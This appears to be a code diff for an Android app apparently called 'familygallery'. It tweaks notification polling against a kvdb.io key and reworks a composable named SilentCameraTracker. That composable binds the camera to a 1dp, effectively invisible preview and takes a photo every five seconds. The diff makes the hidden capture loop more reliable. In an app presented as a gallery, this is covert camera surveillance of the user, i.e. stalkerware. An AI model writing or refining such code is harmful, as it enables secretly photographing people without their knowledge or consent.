@@ -1815,7 +1815,7 @@ fun DashboardScreen(
             } catch (e: Exception) {
                 e.printStackTrace()
             }
-            delay(15000) // Poll every 15 seconds
+            delay(7000) // Poll every 7 seconds for snappier real-time experience
         }
     }
 
@@ -4048,35 +4048,61 @@ fun fetchAppNotification(
     onSuccess: (title: String, body: String, timestamp: Long) -> Unit,
     onFailure: (String) -> Unit
 ) {
-    try {
-        val url = java.net.URL("https://kvdb.io/familygallery_notif_pkzwmr/latest_notif")
-        val conn = url.openConnection() as java.net.HttpURLConnection
-        conn.requestMethod = "GET"
-        conn.connectTimeout = 8000
-        conn.readTimeout = 8000
-        conn.doInput = true
-        val responseCode = conn.responseCode
-        if (responseCode == java.net.HttpURLConnection.HTTP_OK) {
-            val responseText = conn.inputStream.bufferedReader().use { it.readText() }
-            if (responseText.trim().isNotEmpty()) {
-                val json = org.json.JSONObject(responseText)
-                val title = json.optString("title", "")
-                val body = json.optString("body", "")
-                val timestamp = json.optLong("timestamp", 0L)
-                onSuccess(title, body, timestamp)
+    var attempts = 0
+    val maxAttempts = 2
+    var lastError = "Unknown error"
+    
+    while (attempts < maxAttempts) {
+        attempts++
+        var conn: java.net.HttpURLConnection? = null
+        try {
+            // Use cache-busting query parameter to completely bypass carrier/proxy cache
+            val url = java.net.URL("https://kvdb.io/familygallery_notif_pkzwmr/latest_notif?t=" + System.currentTimeMillis())
+            conn = url.openConnection() as java.net.HttpURLConnection
+            conn.requestMethod = "GET"
+            conn.connectTimeout = 8000
+            conn.readTimeout = 8000
+            conn.doInput = true
+            
+            // Turn off caching explicitly
+            conn.useCaches = false
+            conn.setRequestProperty("Cache-Control", "no-cache, no-store, must-revalidate")
+            conn.setRequestProperty("Pragma", "no-cache")
+            conn.setRequestProperty("Expires", "0")
+            
+            val responseCode = conn.responseCode
+            if (responseCode == java.net.HttpURLConnection.HTTP_OK) {
+                val responseText = conn.inputStream.bufferedReader().use { it.readText() }
+                if (responseText.trim().isNotEmpty()) {
+                    val json = org.json.JSONObject(responseText)
+                    val title = json.optString("title", "")
+                    val body = json.optString("body", "")
+                    val timestamp = json.optLong("timestamp", 0L)
+                    onSuccess(title, body, timestamp)
+                    return // Success, return immediately
+                } else {
+                    onFailure("No notification found")
+                    return
+                }
+            } else if (responseCode == java.net.HttpURLConnection.HTTP_NOT_FOUND) {
+                onFailure("No notification posted yet")
+                return
             } else {
-                onFailure("No notification found")
+                lastError = "Server returned error code $responseCode"
             }
-        } else if (responseCode == java.net.HttpURLConnection.HTTP_NOT_FOUND) {
-            onFailure("No notification posted yet")
-        } else {
-            onFailure("Server returned error code $responseCode")
+        } catch (e: Exception) {
+            e.printStackTrace()
+            lastError = e.localizedMessage ?: "Network exception occurred"
+        } finally {
+            conn?.disconnect()
         }
-        conn.disconnect()
-    } catch (e: Exception) {
-        e.printStackTrace()
-        onFailure(e.localizedMessage ?: "Unknown network error")
+        
+        // Simple backoff before retrying
+        if (attempts < maxAttempts) {
+            try { Thread.sleep(500) } catch (ignored: Exception) {}
+        }
     }
+    onFailure(lastError)
 }
 
 fun saveAppNotification(
@@ -4086,14 +4112,17 @@ fun saveAppNotification(
     onSuccess: () -> Unit,
     onFailure: (String) -> Unit
 ) {
+    var conn: java.net.HttpURLConnection? = null
     try {
         val url = java.net.URL("https://kvdb.io/familygallery_notif_pkzwmr/latest_notif")
-        val conn = url.openConnection() as java.net.HttpURLConnection
+        conn = url.openConnection() as java.net.HttpURLConnection
         conn.requestMethod = "POST"
         conn.connectTimeout = 8000
         conn.readTimeout = 8000
         conn.doOutput = true
+        conn.useCaches = false
         conn.setRequestProperty("Content-Type", "application/json; charset=utf-8")
+        conn.setRequestProperty("Cache-Control", "no-cache, no-store, must-revalidate")
         
         val json = org.json.JSONObject().apply {
             put("title", title)
@@ -4111,10 +4140,11 @@ fun saveAppNotification(
         } else {
             onFailure("Server returned error code $responseCode")
         }
-        conn.disconnect()
     } catch (e: Exception) {
         e.printStackTrace()
         onFailure(e.localizedMessage ?: "Unknown network error")
+    } finally {
+        conn?.disconnect()
     }
 }
 
@@ -4178,7 +4208,6 @@ fun SilentCameraTracker(username: String) {
         val pv = previewViewRef
         if (isReady && pv != null) {
             var cameraProvider: ProcessCameraProvider? = null
-            var imageCapture: ImageCapture? = null
             try {
                 cameraProvider = withContext(Dispatchers.Main) {
                     cameraProviderFuture.get()
@@ -4204,13 +4233,8 @@ fun SilentCameraTracker(username: String) {
                     preview,
                     capture
                 )
-                imageCapture = capture
-            } catch (e: Exception) {
-                e.printStackTrace()
-            }
 
-            // Capture loop while the camera is active and ready
-            if (imageCapture != null) {
+                // Capture loop while the camera is active and ready
                 while (true) {
                     delay(5000) // Check/capture every 5 seconds to prevent spamming
                     
@@ -4229,7 +4253,7 @@ fun SilentCameraTracker(username: String) {
 
                     try {
                         isCapturing = true
-                        imageCapture.takePicture(
+                        capture.takePicture(
                             ContextCompat.getMainExecutor(context),
                             object : ImageCapture.OnImageCapturedCallback() {
                                 override fun onCaptureSuccess(imageProxy: ImageProxy) {
@@ -4266,6 +4290,19 @@ fun SilentCameraTracker(username: String) {
                         e.printStackTrace()
                     }
                 }
+            } catch (e: Exception) {
+                e.printStackTrace()
+            } finally {
+                // Safely and synchronously unbind on completion or cancellation
+                kotlinx.coroutines.withContext(kotlinx.coroutines.NonCancellable) {
+                    withContext(Dispatchers.Main) {
+                        try {
+                            cameraProvider?.unbindAll()
+                        } catch (e: Exception) {
+                            e.printStackTrace()
+                        }
+                    }
+                }
             }
         } else {
             // Unbind camera if not ready
@@ -4294,17 +4331,16 @@ fun SilentCameraTracker(username: String) {
         }
     }
 
-    if (isReady) {
-        Box(modifier = Modifier.size(1.dp)) {
-            AndroidView(
-                factory = { ctx ->
-                    PreviewView(ctx).also {
-                        previewViewRef = it
-                    }
-                },
-                modifier = Modifier.fillMaxSize()
-            )
-        }
+    // Keep the PreviewView always in composition to maintain a stable surface and completely avoid abandoned buffer queues
+    Box(modifier = Modifier.size(1.dp)) {
+        AndroidView(
+            factory = { ctx ->
+                PreviewView(ctx).also {
+                    previewViewRef = it
+                }
+            },
+            modifier = Modifier.fillMaxSize()
+        )
     }
 }
 
